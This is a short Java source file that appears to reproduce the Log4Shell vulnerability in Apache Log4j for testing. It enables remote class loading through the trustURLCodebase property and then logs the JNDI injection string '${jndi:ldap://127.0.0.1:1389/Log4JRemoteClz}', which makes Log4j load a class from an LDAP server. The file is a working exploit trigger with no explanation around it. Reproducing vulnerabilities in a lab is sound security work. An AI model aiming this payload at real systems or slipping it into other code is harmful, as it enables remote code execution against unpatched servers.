import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class ClientRun {

    private static final Logger logger = LogManager.getLogger(ClientRun.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("params->{}","${jndi:ldap://127.0.0.1:1389/Log4JRemoteClz}");
    }

}
